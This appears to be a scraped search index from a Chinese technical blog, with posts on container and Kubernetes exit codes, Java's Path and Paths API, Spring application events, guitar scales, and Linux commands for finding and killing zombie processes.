Incompatibility between the container engine and the host operating system or hardware What to do if a container terminated with Exit Code 125? Check if the command used to run the container uses the proper syntax Check if the user running the container, or the context in which the command is executed in the image specification, has sufficient permissions to create containers on the host If your container engine provides other options for running a container, try them. For example, in Docker, try docker start instead of docker run Test if you are able to run other containers on the host using the same username or context. If not, reinstall the container engine, or resolve the underlying compatibility issue between the container engine and the host setup ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:5:1","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Exit Code 126: Command Invoke Error Exit Code 126 means that a command used in the container specification could not be invoked. This is often the cause of a missing dependency or an error in a continuous integration script used to run the container. What to do if a container terminated with Exit Code 126? Check the container logs to see which command could not be invoked Try running the container specification without the command to ensure you isolate the problem Troubleshoot the command to ensure you are using the correct syntax and all dependencies are available Correct the container specification and retry running the container ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:6:0","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Exit Code 127: File or Directory Not Found Exit Code 127 means a command specified in the container specification refers to a non-existent file or directory. What to do if a container terminated with Exit Code 127? Same as Exit Code 126 above, identify the failing command and make sure you reference a valid filename and file path available within the container image. ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:7:0","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Exit Code 128: Invalid Argument Used on Exit Exit Code 128 means that code within the container triggered an exit command, but did not provide a valid exit code. The Linux exit command only allows integers between 0-255, so if the process was exited with, for example, exit code 3.5, the logs will report Exit Code 128. What to do if a container terminated with Exit Code 128? Check the container logs to identify which library caused the container to exit. Identify where the offending library uses the exit command, and correct it to provide a valid exit code. ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:8:0","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Exit Code 134: Abnormal Termination (SIGABRT) Exit Code 134 means that the container abnormally terminated itself, closed the process and flushed open streams. This operation is irreversible, like SIGKILL (see Exit Code 137 below). A process can trigger SIGABRT by doing one of the following: Calling the abort() function in the libc library Calling the assert() macro, used for debugging. The process is then aborted if the assertion is false. What to do if a container terminated with Exit Code 134? Check container logs to see which library triggered the SIGABRT signal Check if process abortion was planned (for example because the library was in debug mode), and if not, troubleshoot the library and modify it to avoid aborting the container. ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:9:0","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Exit Code 137: Immediate Termination (SIGKILL) Exit Code 137 means that the container has received a SIGKILL signal from the host operating system. This signal instructs a process to terminate immediately, with no grace period. This can be either: Triggered when a container is killed via the container engine, for example when using the docker kill command Triggered by a Linux user sending a kill -9 command to the process Triggered by Kubernetes after attempting to terminate a container and waiting for a grace period of 30 seconds (by default) Triggered automatically by the host, usually due to running out of memory. In this case, the docker inspect command will indicate an OOMKilled error. What to do if a container terminated with Exit Code 137? Check logs on the host to see what happened prior to the container terminating, and whether it previously received a SIGTERM signal (graceful termination) before receiving SIGKILL If there was a prior SIGTERM signal, check if your container process handles SIGTERM and is able to gracefully terminate If there was no SIGTERM and the container reported an OOMKilled error, troubleshoot memory issues on the host Learn more in our detailed guide to the SIGKILL signal » ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:10:0","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Exit Code 139: Segmentation Fault (SIGSEGV) Exit Code 139 means that the container received a SIGSEGV signal from the operating system. This indicates a segmentation error – a memory violation, caused by a container trying to access a memory location to which it does not have access. There are three common causes of SIGSEGV errors: Coding error—container process did not initialize properly, or it tried to access memory through a pointer to previously freed memory Incompatibility between binaries and libraries—container process runs a binary file that is not compatible with a shared library, and thus may try to access inappropriate memory addresses Hardware incompatibility or misconfiguration—if you see multiple segmentation errors across multiple libraries, there may be a problem with memory subsystems on the host or a system configuration issue What to do if a container terminated with Exit Code 139? Check if the container process handles SIGSEGV. On both Linux and Windows, you can handle a container’s response to segmentation violations. For example, the container can collect and report a stack trace If you need to further troubleshoot SIGSEGV, you may need to set the operating system to allow programs to run even after a segmentation fault occurs, to allow for investigation and debugging. Then, try to intentionally cause a segmentation violation and debug the library causing the issue If you cannot replicate the issue, check memory subsystems on the host and troubleshoot memory configuration Learn more in our detailed guide to the SIGSEGV signal » ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:11:0","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Exit Code 143: Graceful Termination (SIGTERM) Exit Code 143 means that the container received a SIGTERM signal from the operating system, which asks the container to gracefully terminate, and the container succeeded in gracefully terminating (otherwise you will see Exit Code 137). This exit code can be: Triggered by the container engine stopping the container, for example when using the docker stop or docker-compose down commands Triggered by Kubernetes setting a pod to Terminating status, and giving containers a 30 second period to gracefully shut down What to do if a container terminated with Exit Code 143? Check host logs to see the context in which the operating system sent the SIGTERM signal. If you are using Kubernetes, check the kubelet logs to see if and when the pod was shut down. In general, Exit Code 143 does not require troubleshooting. It means the container was properly shut down after being instructed to do so by the host. Learn more in our detailed guide to the SIGTERM signal » ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:12:0","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Exit Code 255: Exit Status Out Of Range When you see exit code 255, it implies the main entrypoint of a container stopped with that status. It means that the container stopped, but it is not known for what reason. What to do if a container terminated with Exit Code 255? If the container is running in a virtual machine, first try removing overlay networks configured on the virtual machine and recreating them. If this does not solve the problem, try deleting and recreating the virtual machine, then rerunning the container on it. Failing the above, bash into the container and examine logs or other clues about the entrypoint process and why it is failing. ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:13:0","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Which Kubernetes Errors are Related to Container Exit Codes? Whenever containers fail within a pod, or Kubernetes instructs a pod to terminate for any reason, containers will shut down with exit codes. Identifying the exit code can help you understand the underlying cause of a pod exception. You can use the following command to view pod errors: kubectl describe pod [name] The result will look something like this: Containers:kubedns:Container ID:...Image:...Image ID:...Ports:...Host Ports:...Args:...State:RunningStarted:Fri, 15 Oct 2021 12:06:01 +0800Last State:TerminatedReason:ErrorExit Code:255Started:Fri, 15 Oct 2021 11:43:42 +0800Finished:Fri, 15 Oct 2021 12:05:17 +0800Ready:TrueRestart Count:1 Use the Exit Code provided by kubectl to troubleshoot the issue: If the Exit Code is 0 – the container exited normally, no troubleshooting is required If the Exit Code is between1-128 – the container terminated due to an internal error, such as a missing or invalid command in the image specification If the Exit Code is between 129-255 – the container was stopped as the result of an operating signal, such as SIGKILL or SIGINT If the Exit Code was exit(-1) or another value outside the 0-255 range, kubectl translates it to a value within the 0-255 range. Refer to the relevant section above to see how to troubleshoot the container for each exit code. ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:14:0","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Docker"],"content":"Troubleshooting Kubernetes Pod Termination with Komodor As a Kubernetes administrator or user, pods or containers terminating unexpectedly can be a pain and can result in severe production issues. The troubleshooting process in Kubernetes is complex and, without the right tools, can be stressful, ineffective, and time-consuming. Some best practices can help minimize the chances of container failure affecting your applications, but eventually, something will go wrong—simply because it can. This is the reason why we created Komodor, a tool that helps dev and ops teams stop wasting their precious time looking for needles in (hay)stacks every time things go wrong. Acting as a single source of truth (SSOT) for all of your k8s troubleshooting needs, Komodor offers: Change intelligence: Every issue is a result of a change. Within seconds we can help you understand exactly who did what and when. In-depth visibility: A complete activity timeline, showing all code and config changes, deployments, alerts, code diffs, pod logs and etc. All within one pane of glass with easy drill-down options. Insights into service dependencies: An easy way to understand cross-service changes and visualize their ripple effects across your entire system. Seamless notifications: Direct integration with your existing communication channels (e.g., Slack) so you’ll have all the information you need, when you need it. ","date":"2023-03-18","objectID":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/:15:0","tags":["Docker"],"title":"容器和Kubernetes中的退出代码–完整指南","uri":"/posts/2023/03/%E5%AE%B9%E5%99%A8%E5%92%8Ckubernetes%E4%B8%AD%E7%9A%84%E9%80%80%E5%87%BA%E4%BB%A3%E7%A0%81%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"},{"categories":["Java"],"content":"用于读Path操作的接口（Path）与实现类（Paths） ","date":"2022-12-06","objectID":"/posts/2022/12/java%E7%9A%84path%E5%92%8Cpaths/:0:0","tags":["Java"],"title":"Java的path和paths","uri":"/posts/2022/12/java%E7%9A%84path%E5%92%8Cpaths/"},{"categories":["Java"],"content":"1、模块：java.nio.file.Path、java.nio.file.Paths ","date":"2022-12-06","objectID":"/posts/2022/12/java%E7%9A%84path%E5%92%8Cpaths/:1:0","tags":["Java"],"title":"Java的path和paths","uri":"/posts/2022/12/java%E7%9A%84path%E5%92%8Cpaths/"},{"categories":["Java"],"content":"2、方法 ","date":"2022-12-06","objectID":"/posts/2022/12/java%E7%9A%84path%E5%92%8Cpaths/:2:0","tags":["Java"],"title":"Java的path和paths","uri":"/posts/2022/12/java%E7%9A%84path%E5%92%8Cpaths/"},{"categories":["Java"],"content":"2.1、Paths 只有两个静态方法，用法：Paths.xxx( … ) Path get( String first , String… more ) 用连接符把这些参数中的String连接起来，得到一个对应的Path（和Path.of( … )相同）Windows中的连接符是\\ Path get( URI uri ) 将一个给定的URI转化为Path对象 ","date":"2022-12-06","objectID":"/posts/2022/12/java%E7%9A%84path%E5%92%8Cpaths/:3:0","tags":["Java"],"title":"Java的path和paths","uri":"/posts/2022/12/java%E7%9A%84path%E5%92%8Cpaths/"},{"categories":["Java"],"content":"2.2、Path ","date":"2022-12-06","objectID":"/posts/2022/12/java%E7%9A%84path%E5%92%8Cpaths/:4:0","tags":["Java"],"title":"Java的path和paths","uri":"/posts/2022/12/java%E7%9A%84path%E5%92%8Cpaths/"},{"categories":["Java"],"content":"2.2.1、静态方法，用法：Path.xxx( … ) Path of( String first , String… more) 与Paths.get(…)作用相同返回一个Path对象 Path of( URI uri ) ","date":"2022-12-06","objectID":"/posts/2022/12/java%E7%9A%84path%E5%92%8Cpaths/:4:1","tags":["Java"],"title":"Java的path和paths","uri":"/posts/2022/12/java%E7%9A%84path%E5%92%8Cpaths/"},{"categories":["Java"],"content":"2.2.2、实例方法，用法：p.xxx( … ) 返回值类型 方法 说明 int compareTo(Path other) 比较两个Path boolean endsWith(String other) 判断该Path是否以other结尾 boolean endsWith(Path other) 判断该Path是否以另一个Path结尾 boolean equals(Object other) 判断该Path是否和另一个元素相等 Path getFileName() 文件名对应的Path FileSystem getFileSystem() 返回构造了这个Path的文件系统 Path getName(int index) 返回Path某一级目录的名字比如 usr\\Docs\\Test，对应0/1/2分别是usr、Docs、Test int getNameCount() 返回Path目录有几级，常配合getName(int index)使用 Path getParent() 获取父目录的Path Path getRoot() 获取根目录的Path int hashCode() hash code boolean isAbsolute() 判断该Path是否是绝对路径 Iterator iterator() 实现迭代器，允许对Path[ ]使用for each遍历 Path normalize() 将路径正规化（即转换为不含.和..的绝对路径） WatchKey register(WatchService watcher, WatchEvent.Kind\u003c?\u003e… events) WatchKey register(WatchService watcher, WatchEvent.Kind\u003c?\u003e[] events, WatchEvent.Modifier… modifiers) Path relativize(Path other) 返回两个路径间的相对路径 Path resolve(String other) 如果other是绝对路径，返回other；如果other是null，返回this；否则，在this之后拼接other形成新Path Path resolve(Path other) Path resolveSibling(String other) 如果other是绝对路径，返回other；如果other是null，返回this；否则，在this的父目录下拼接other形成新的Path Path resolveSibling(Path other) boolean startsWith(String other) 判断该Path是否以other开头 boolean startsWith(Path other) 判断该Path是否以other开头 Path subPath(int start , int end) 返回从start到end的subpath Path toAbsolutePath() 返回绝对路径 File toFile() Path→File Path toRealPath(LinkOption… options) String toString() 返回该Path对应的String URI toUri() 返回该Path对应的URI 正规路径：不含.和..的绝对路径 ","date":"2022-12-06","objectID":"/posts/2022/12/java%E7%9A%84path%E5%92%8Cpaths/:4:2","tags":["Java"],"title":"Java的path和paths","uri":"/posts/2022/12/java%E7%9A%84path%E5%92%8Cpaths/"},{"categories":["Java"],"content":"3、方法说明 最常用： Path→String：p.toString() ","date":"2022-12-06","objectID":"/posts/2022/12/java%E7%9A%84path%E5%92%8Cpaths/:5:0","tags":["Java"],"title":"Java的path和paths","uri":"/posts/2022/12/java%E7%9A%84path%E5%92%8Cpaths/"},{"categories":["音乐"],"content":"这里收集整理一些吉他音阶图，方便记忆。 ","date":"2022-10-01","objectID":"/posts/2022/10/%E5%90%89%E4%BB%96%E6%8C%87%E6%9D%BF%E9%9F%B3%E9%98%B6%E5%92%8C%E4%BA%94%E5%A3%B0%E9%9F%B3%E9%98%B6/:0:0","tags":["吉他","音乐"],"title":"吉他指板音阶和五声音阶","uri":"/posts/2022/10/%E5%90%89%E4%BB%96%E6%8C%87%E6%9D%BF%E9%9F%B3%E9%98%B6%E5%92%8C%E4%BA%94%E5%A3%B0%E9%9F%B3%E9%98%B6/"},{"categories":["音乐"],"content":"各调和弦级数 ","date":"2022-10-01","objectID":"/posts/2022/10/%E5%90%89%E4%BB%96%E6%8C%87%E6%9D%BF%E9%9F%B3%E9%98%B6%E5%92%8C%E4%BA%94%E5%A3%B0%E9%9F%B3%E9%98%B6/:1:0","tags":["吉他","音乐"],"title":"吉他指板音阶和五声音阶","uri":"/posts/2022/10/%E5%90%89%E4%BB%96%E6%8C%87%E6%9D%BF%E9%9F%B3%E9%98%B6%E5%92%8C%E4%BA%94%E5%A3%B0%E9%9F%B3%E9%98%B6/"},{"categories":["音乐"],"content":"音阶位置 ","date":"2022-10-01","objectID":"/posts/2022/10/%E5%90%89%E4%BB%96%E6%8C%87%E6%9D%BF%E9%9F%B3%E9%98%B6%E5%92%8C%E4%BA%94%E5%A3%B0%E9%9F%B3%E9%98%B6/:2:0","tags":["吉他","音乐"],"title":"吉他指板音阶和五声音阶","uri":"/posts/2022/10/%E5%90%89%E4%BB%96%E6%8C%87%E6%9D%BF%E9%9F%B3%E9%98%B6%E5%92%8C%E4%BA%94%E5%A3%B0%E9%9F%B3%E9%98%B6/"},{"categories":["音乐"],"content":"五种指型音阶 ","date":"2022-10-01","objectID":"/posts/2022/10/%E5%90%89%E4%BB%96%E6%8C%87%E6%9D%BF%E9%9F%B3%E9%98%B6%E5%92%8C%E4%BA%94%E5%A3%B0%E9%9F%B3%E9%98%B6/:3:0","tags":["吉他","音乐"],"title":"吉他指板音阶和五声音阶","uri":"/posts/2022/10/%E5%90%89%E4%BB%96%E6%8C%87%E6%9D%BF%E9%9F%B3%E9%98%B6%E5%92%8C%E4%BA%94%E5%A3%B0%E9%9F%B3%E9%98%B6/"},{"categories":["音乐"],"content":"五声音阶 ","date":"2022-10-01","objectID":"/posts/2022/10/%E5%90%89%E4%BB%96%E6%8C%87%E6%9D%BF%E9%9F%B3%E9%98%B6%E5%92%8C%E4%BA%94%E5%A3%B0%E9%9F%B3%E9%98%B6/:4:0","tags":["吉他","音乐"],"title":"吉他指板音阶和五声音阶","uri":"/posts/2022/10/%E5%90%89%E4%BB%96%E6%8C%87%E6%9D%BF%E9%9F%B3%E9%98%B6%E5%92%8C%E4%BA%94%E5%A3%B0%E9%9F%B3%E9%98%B6/"},{"categories":["音乐"],"content":"音阶位置 ","date":"2022-10-01","objectID":"/posts/2022/10/%E5%90%89%E4%BB%96%E6%8C%87%E6%9D%BF%E9%9F%B3%E9%98%B6%E5%92%8C%E4%BA%94%E5%A3%B0%E9%9F%B3%E9%98%B6/:4:1","tags":["吉他","音乐"],"title":"吉他指板音阶和五声音阶","uri":"/posts/2022/10/%E5%90%89%E4%BB%96%E6%8C%87%E6%9D%BF%E9%9F%B3%E9%98%B6%E5%92%8C%E4%BA%94%E5%A3%B0%E9%9F%B3%E9%98%B6/"},{"categories":["音乐"],"content":"指型练习 ","date":"2022-10-01","objectID":"/posts/2022/10/%E5%90%89%E4%BB%96%E6%8C%87%E6%9D%BF%E9%9F%B3%E9%98%B6%E5%92%8C%E4%BA%94%E5%A3%B0%E9%9F%B3%E9%98%B6/:4:2","tags":["吉他","音乐"],"title":"吉他指板音阶和五声音阶","uri":"/posts/2022/10/%E5%90%89%E4%BB%96%E6%8C%87%E6%9D%BF%E9%9F%B3%E9%98%B6%E5%92%8C%E4%BA%94%E5%A3%B0%E9%9F%B3%E9%98%B6/"},{"categories":["音乐"],"content":"C调指板音阶 ","date":"2022-10-01","objectID":"/posts/2022/10/%E5%90%89%E4%BB%96%E6%8C%87%E6%9D%BF%E9%9F%B3%E9%98%B6%E5%92%8C%E4%BA%94%E5%A3%B0%E9%9F%B3%E9%98%B6/:5:0","tags":["吉他","音乐"],"title":"吉他指板音阶和五声音阶","uri":"/posts/2022/10/%E5%90%89%E4%BB%96%E6%8C%87%E6%9D%BF%E9%9F%B3%E9%98%B6%E5%92%8C%E4%BA%94%E5%A3%B0%E9%9F%B3%E9%98%B6/"},{"categories":["音乐"],"content":"各调指板音阶 ","date":"2022-10-01","objectID":"/posts/2022/10/%E5%90%89%E4%BB%96%E6%8C%87%E6%9D%BF%E9%9F%B3%E9%98%B6%E5%92%8C%E4%BA%94%E5%A3%B0%E9%9F%B3%E9%98%B6/:6:0","tags":["吉他","音乐"],"title":"吉他指板音阶和五声音阶","uri":"/posts/2022/10/%E5%90%89%E4%BB%96%E6%8C%87%E6%9D%BF%E9%9F%B3%E9%98%B6%E5%92%8C%E4%BA%94%E5%A3%B0%E9%9F%B3%E9%98%B6/"},{"categories":["Java"],"content":"Spring 的事件（Application Event）为 Bean 与 Bean 之间的消息通信提供了支持。当一个 Bean 处理完一个任务之后，希望另一个 Bean 知道并能做相应的处理，这时我们就需要让另一个 Bean 监听当前 Bean 所发送的事件。（观察者模式） Spring 的事件需要遵循以下流程： 自定义事件，继承 ApplicationEvent。 定义事件监听器，实现 ApplicationListener。 使用容器发布事件。 什么是ApplicationContext? 它是Spring的核心，Context我们通常解释为上下文环境，但是理解成容器会更好些。 ApplicationContext则是应用的容器。 Spring把Bean（object）放在容器中，需要用就通过get方法取出来。 ApplicationEvent 是个抽象类，里面只有一个构造函数和一个长整型的timestamp。 ApplicationListener 是一个接口，里面只有一个onApplicationEvent方法。 所以自己的类在实现该接口的时候，要实装该方法。 如果在上下文中部署一个实现了ApplicationListener接口的bean, 那么每当在一个ApplicationEvent发布到 ApplicationContext时， 这个bean得到通知。其实这就是标准的Observer设计模式 ","date":"2022-09-30","objectID":"/posts/2022/09/spring%E4%BA%8B%E4%BB%B6application-event/:0:0","tags":["Java"],"title":"Spring事件Application Event","uri":"/posts/2022/09/spring%E4%BA%8B%E4%BB%B6application-event/"},{"categories":["Java"],"content":"一、如何使用？ 1、 建立event public class BookingCreatedEvent extends ApplicationEvent { private static final long serialVersionUID = 3039313222160544111L; private Booking booking; public BookingCreatedEvent(Object source) { super(source); } public BookingCreatedEvent(Object source, Booking booking) { super(source); this.booking = booking; } public Booking getBooking() { return booking; } } BookingCreatedEvent需要继承ApplicationEvent。 2、建立listener @Component public class BookingEventsListener implements ApplicationListener \u003cBookingCreatedEvent\u003e { private static final Logger log = Logger.getLogger(); //listener实现 public void onApplicationEvent(BookingCreatedEvent event) { log.debug(\"bookingId:\" + event.getBooking().getId()); //do something  } } BookingEventsListener 需要实现ApplicationListener 并重写onApplicationEvent方法。ApplicationListener带泛型，如果泛型参数为BookingCreatedEvent，则表示只监听BookingCreatedEvent类型的事件，如果泛型参数为ApplicationEvent ，则表示监听所有类型的事件。另外可以用@Component来注册组件，这样就不需要在spring的配置文件中指定了。 3、触发event @Service(\"bookingService\") @Repository public class JpaBookingService implements BookingService, ApplicationContextAware { private ApplicationContext context; public void setApplicationContext(ApplicationContext applicationContext)throws BeansException { log.debug(\"Autowired applicationContext\"); this.context = applicationContext; } //省略的代码 @Transactional public void persistBooking(Booking booking)throws HibernateException, SQLException { em.persist(booking); log.debug(\"fire BookingCreatedEvent\"); BookingCreatedEvent bookingCreatedEvent =newBookingCreatedEvent(this, booking); //触发event this.context.publishEvent(bookingCreatedEvent); } } 触发要实现ApplicationContextAware，用于引入ApplicationContext，由于bookingService也 是spring组件，所以在系统启动的时候，ApplicationContext已经注入。也可以用如下方式直接注入 ApplicationContext。 @Autowired private ApplicationContext applicationContext; ","date":"2022-09-30","objectID":"/posts/2022/09/spring%E4%BA%8B%E4%BB%B6application-event/:0:1","tags":["Java"],"title":"Spring事件Application Event","uri":"/posts/2022/09/spring%E4%BA%8B%E4%BB%B6application-event/"},{"categories":["Java"],"content":"二、有什么好处？ 解耦： ​ 如上例子，如果客人booking了hotel以后，系统要发email给客人，那我们就可以在listener的do something处加上发送email的代码。 ​ 上面我们讲用@Component把listener注册成了spring的组件，这样listener的用途是在runtime的时候解耦。而如果我们把listener用配置文件的方式注册的话，主要用途是在部署的时候解耦。在实际应用中，两种情况都有。 ​ 另外要注意的一点是，service和listener是同步的，在service中的persistBooking有注册 @Transactional的情况下，listener中的do something和service中的persistBooking是在同一个tansaction下。 ​ 如果要做异步，需要通过MQ或者数据库中转。 ","date":"2022-09-30","objectID":"/posts/2022/09/spring%E4%BA%8B%E4%BB%B6application-event/:0:2","tags":["Java"],"title":"Spring事件Application Event","uri":"/posts/2022/09/spring%E4%BA%8B%E4%BB%B6application-event/"},{"categories":["Java"],"content":"附录 作者：守住阳光 链接：https://www.jianshu.com/p/e450cded3306 ","date":"2022-09-30","objectID":"/posts/2022/09/spring%E4%BA%8B%E4%BB%B6application-event/:1:0","tags":["Java"],"title":"Spring事件Application Event","uri":"/posts/2022/09/spring%E4%BA%8B%E4%BB%B6application-event/"},{"categories":["Linux"],"content":"介绍linux运维常用命令操作","date":"2022-09-19","objectID":"/posts/2022/09/linux%E8%BF%90%E7%BB%B4%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%9B%B4%E6%96%B0%E4%B8%AD/","tags":["Linux"],"title":"linux运维常用命令[更新中]","uri":"/posts/2022/09/linux%E8%BF%90%E7%BB%B4%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%9B%B4%E6%96%B0%E4%B8%AD/"},{"categories":["Linux"],"content":"介绍linux运维常用命令操作 ","date":"2022-09-19","objectID":"/posts/2022/09/linux%E8%BF%90%E7%BB%B4%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%9B%B4%E6%96%B0%E4%B8%AD/:0:0","tags":["Linux"],"title":"linux运维常用命令[更新中]","uri":"/posts/2022/09/linux%E8%BF%90%E7%BB%B4%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%9B%B4%E6%96%B0%E4%B8%AD/"},{"categories":["Linux"],"content":"僵尸进程查看 ps -e -o stat,ppid,pid,cmd|egrep ‘^[Zz]’ ps：ps命令用于获取当前系统的进程信息. -e：参数用于列出所有的进程 -o：参数用于设定输出格式，这里只输出进程的stat(状态信息)、ppid(父进程pid)、pid（当前进程的pid)，cmd(即进程的可执行文件。 egrep：是linux下的正则表达式工具 ‘^[Zz]'：这是正则表达式，^表示第一个字符的位置，[Zz]，表示z或者大写的Z字母，即表示第一个字符为Z或者z开头的进程数据，只所以这样是因为僵尸进程的状态信息以Z或者z字母开头。 ps -ef | grep “defunct” ps -e -o stat,ppid,pid,cmd|egrep '^[Zz]' ps -ef | grep \"defunct\" ","date":"2022-09-19","objectID":"/posts/2022/09/linux%E8%BF%90%E7%BB%B4%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%9B%B4%E6%96%B0%E4%B8%AD/:1:0","tags":["Linux"],"title":"linux运维常用命令[更新中]","uri":"/posts/2022/09/linux%E8%BF%90%E7%BB%B4%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%9B%B4%E6%96%B0%E4%B8%AD/"},{"categories":["Linux"],"content":"僵尸进程删除 查看系统是否有僵尸进程 top 使用Top命令查找，当zombie前的数量不为0时，即系统内存在相应数量的僵尸进程 定位僵尸进程 使用命令ps -A -ostat,ppid,pid,cmd |grep -e ‘^[Zz]‘定位僵尸进程以及该僵尸进程的父进程 ps -A -ostat,ppid,pid,cmd |grep -e '^[Zz]' 使用Kill -HUP 僵尸进程ID来杀死僵尸进程，往往此种情况无法杀死僵尸进程，此时就需要杀死僵尸进程的父进程 kill -HUP 僵尸进程父ID ps -A -o stat,ppid,pid,cmd | grep -e '^[Zz]' | awk '{print $2}' | xargs kill -9 参数解读 ps -A -ostat,ppid,pid,cmd |grep -e '^[Zz]' -A 参数列出所有进程 -o 自定义输出字段 stat（状态）、ppid（进程父id）、pid（进程id）、cmd（命令） 